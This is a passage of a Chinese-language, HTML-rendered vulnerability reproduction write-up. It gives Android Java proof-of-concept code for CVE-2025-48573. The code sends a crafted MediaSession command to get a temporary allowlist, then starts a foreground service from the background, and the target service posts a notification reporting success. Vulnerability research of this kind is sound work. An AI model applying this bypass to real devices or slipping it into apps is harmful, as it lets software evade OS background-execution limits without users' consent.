<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">        new</span><span style="color:#59873A;--shiki-dark:#80A665"> Handler</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">Looper</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getMainLooper</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">postDelayed</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#A65E2B;--shiki-dark:#C99076">this</span><span style="color:#1E754F;--shiki-dark:#4D9375">::</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">triggerExploit</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 5000</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    private</span><span style="color:#AB5959;--shiki-dark:#CB7676"> void</span><span style="color:#59873A;--shiki-dark:#80A665"> triggerExploit</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        Log</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">d</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">TAG</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">Triggering Exploit via sendCommand...</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        </span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // 获取当前 Session 的 Controller</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        MediaController</span><span style="color:#B07D48;--shiki-dark:#BD976A"> controller</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B07D48;--shiki-dark:#BD976A"> mSession</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getController</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        </span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">        if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">controller </span><span style="color:#AB5959;--shiki-dark:#CB7676">!=</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">{</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">            // 4. 关键点：发送自定义 Command</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">            // 这会调用系统服务中的 MediaSessionRecord.sendCommand</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">            // 在漏洞版本中，这会触发 mService.tempAllowlistTargetPkgIfPossible(...)</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            controller</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">sendCommand</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">EXPLOIT_CMD</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#a65e2b;--shiki-dark:#d4976c">}</span><span style="color:#1E754F;--shiki-dark:#4D9375"> else</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">{</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            Log</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">e</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">TAG</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">Controller is null!</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#a65e2b;--shiki-dark:#d4976c">}</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    private</span><span style="color:#AB5959;--shiki-dark:#CB7676"> void</span><span style="color:#59873A;--shiki-dark:#80A665"> attemptPrivilegeEscalation</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        Log</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">d</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">TAG</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">Attempting to start Foreground Service from background...</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">        try</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">{</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            Intent</span><span style="color:#B07D48;--shiki-dark:#BD976A"> intent</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#1E754F;--shiki-dark:#4D9375"> new</span><span style="color:#59873A;--shiki-dark:#80A665"> Intent</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#A65E2B;--shiki-dark:#C99076">this</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B07D48;--shiki-dark:#BD976A"> ForegroundServiceTarget</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">class</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">            // 尝试启动前台服务</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">            startForegroundService</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">intent</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            Log</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">d</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">TAG</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">SUCCESS! Foreground Service started via vulnerability.</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#a65e2b;--shiki-dark:#d4976c">}</span><span style="color:#1E754F;--shiki-dark:#4D9375"> catch</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Exception </span><span style="color:#B07D48;--shiki-dark:#BD976A">e</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">{</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            Log</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">e</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">TAG</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">FAILED. Exploit blocked or patched.</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> e</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#a65e2b;--shiki-dark:#d4976c">}</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    @</span><span style="color:#AB5959;--shiki-dark:#CB7676">Override</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    public</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> IBinder </span><span style="color:#59873A;--shiki-dark:#80A665">onBind</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Intent </span><span style="color:#B07D48;--shiki-dark:#BD976A">intent</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">        return</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"><span style="color:#2993a3;--shiki-dark:#5eaab5">}</span></span></code></pre>
<h4 id="c-foregroundservicetargetjava-验证目标"><a class="anchor" href="#c-foregroundservicetargetjava-验证目标">#</a> C. ForegroundServiceTarget.java (验证目标)</h4>
<p>这是我们试图非法启动的服务，如果它成功启动并显示通知，说明漏洞利用成功。</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-java"><span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">package</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> com</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">example</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">cve_2025_48573_poc</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">app</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Notification</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">app</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">NotificationChannel</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">app</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">NotificationManager</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">app</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Service</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">content</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Intent</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">graphics</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Color</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">os</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">IBinder</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">util</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Log</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> class</span><span style="color:#2E8F82;--shiki-dark:#5DA994"> ForegroundServiceTarget</span><span style="color:#AB5959;--shiki-dark:#CB7676"> extends</span><span style="color:#59873A;--shiki-dark:#80A665"> Service</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">{</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    private</span><span style="color:#AB5959;--shiki-dark:#CB7676"> static</span><span style="color:#AB5959;--shiki-dark:#CB7676"> final</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> String</span><span style="color:#B07D48;--shiki-dark:#BD976A"> CHANNEL_ID</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">EXPLOIT_CHANNEL_001</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    private</span><span style="color:#AB5959;--shiki-dark:#CB7676"> static</span><span style="color:#AB5959;--shiki-dark:#CB7676"> final</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> String</span><span style="color:#B07D48;--shiki-dark:#BD976A"> TAG</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">CVE-POC-TARGET</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    @</span><span style="color:#AB5959;--shiki-dark:#CB7676">Override</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> void</span><span style="color:#59873A;--shiki-dark:#80A665"> onCreate</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#A65E2B;--shiki-dark:#C99076">        super</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">onCreate</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        Log</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">d</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">TAG</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">Target Service Created!</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD"> // 添加日志证明服务起来了</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    @</span><span style="color:#AB5959;--shiki-dark:#CB7676">Override</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> int</span><span style="color:#59873A;--shiki-dark:#80A665"> onStartCommand</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Intent </span><span style="color:#B07D48;--shiki-dark:#BD976A">intent</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#AB5959;--shiki-dark:#CB7676"> int</span><span style="color:#B07D48;--shiki-dark:#BD976A"> flags</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#AB5959;--shiki-dark:#CB7676"> int</span><span style="color:#B07D48;--shiki-dark:#BD976A"> startId</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        Log</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">d</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">TAG</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">onStartCommand called - preparing notification</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">        createNotificationChannel</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        Notification</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Builder</span><span style="color:#B07D48;--shiki-dark:#BD976A"> builder</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#1E754F;--shiki-dark:#4D9375"> new</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> Notification</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">Builder</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#A65E2B;--shiki-dark:#C99076">this</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> CHANNEL_ID</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">                .</span><span style="color:#59873A;--shiki-dark:#80A665">setContentTitle</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">漏洞复现成功</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">                .</span><span style="color:#59873A;--shiki-dark:#80A665">setContentText</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">我已经成功绕过后台限制启动了前台服务！</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">                .</span><span style="color:#59873A;--shiki-dark:#80A665">setSmallIcon</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">R</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">drawable</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">stat_sys_warning</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">                .</span><span style="color:#59873A;--shiki-dark:#80A665">setAutoCancel</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#1E754F;--shiki-dark:#4D9375">false</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // Android 14+ 必须在这里指定类型，如果你的 targetSdk 较高</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // startForeground(1, builder.build(), </span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        //    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // Android 13及以下：</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">        startForeground</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#2F798A;--shiki-dark:#4C9A91">1</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B07D48;--shiki-dark:#BD976A"> builder</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">build</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">        Log</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">d</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">TAG</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">startForeground called</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">        return</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> START_NOT_STICKY</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    private</span><span style="color:#AB5959;--shiki-dark:#CB7676"> void</span><span style="color:#59873A;--shiki-dark:#80A665"> createNotificationChannel</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        NotificationManager</span><span style="color:#B07D48;--shiki-dark:#BD976A"> manager</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#59873A;--shiki-dark:#80A665"> getSystemService</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">NotificationManager</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">class</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">        if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">manager </span><span style="color:#AB5959;--shiki-dark:#CB7676">!=</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">{</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            NotificationChannel</span><span style="color:#B07D48;--shiki-dark:#BD976A"> serviceChannel</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#1E754F;--shiki-dark:#4D9375"> new</span><span style="color:#59873A;--shiki-dark:#80A665"> NotificationChannel</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">                    CHANNEL_ID</span><span style="color:#999999;--shiki-dark:#666666">,</span></span>
<span class="line"><span style="color:#B5695977;--shiki-dark:#C98A7D77">                    "</span><span style="color:#B56959;--shiki-dark:#C98A7D">Exploit Success Channel</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">,</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">                    NotificationManager</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">IMPORTANCE_HIGH</span><span style="color:#A0ADA0;--shiki-dark:#758575DD"> // 设为 HIGH 确保弹出</span></span>
